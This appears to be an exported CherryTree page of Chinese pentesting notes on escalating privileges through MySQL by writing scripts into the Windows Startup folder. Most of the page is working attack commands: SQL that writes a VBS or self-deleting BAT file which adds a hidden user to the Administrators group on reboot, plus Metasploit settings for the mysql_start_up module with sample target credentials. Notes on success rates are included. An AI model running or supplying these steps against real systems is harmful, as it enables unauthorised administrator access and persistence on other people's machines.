<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>启动项提权</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>启动项提权</h1><br/>1. 创建表并插入vbs脚本到表中<br /><br />show databases ;<br />use test;<br />show tables;<br />create table a (cmd text); <br />insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot; ) &quot; ); <br />insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user aspnet aspnettest/add&quot;&quot;,0)&quot;) ;<br />insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators aspnet /add&quot;&quot;,0) &quot; ); <br />select * from a;<br /><br /><br />2. 导出 vbs 脚本到启动<br /><br />select * from a into outfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.vbs&quot;;<br /><br />导入成功后，系统重新启动时会自动用户到管理员组中。在实际使用过程中该脚本成功执行的几率比较低，有时候会出现不能导出的错误。<br />推荐使用以下脚本：<br /><br />show databases ;<br />use test;<br />show tables;<br />create table b (cmd text); <br />insert into b values (&quot;net user Aspnet 123545345!* /add&quot;);<br />insert into b values (&quot;net localgroup administrators Aspnet /add&quot;);<br />insert into b values (&quot;del b.bat&quot;);<br />select * from b into outfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\b.bat&quot;;<br /><br />该脚本执行后虽然会闪现Dos窗口，如果有权限导入到启动选项中，则一定会执行成功，在虚拟机中通过MySQL连接器连接并执行以上命令后，在“C:\Documents and Settings\All Users\「开始」菜单\程序\启动”目录中会有刚才导出的b.bat脚本文件<br /><br /><br />3.msf下模块exploit/windows/mysql/mysql_start_up提权<br />use exploit/windows/mysql/mysql_start_up<br />set rhost 192.168.2.1<br />set rport 3306<br />set username root<br />set password 123456<br />run<br /><br />msf下mysql_start_up提权有一定的几率，对英文版系统支持较好。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>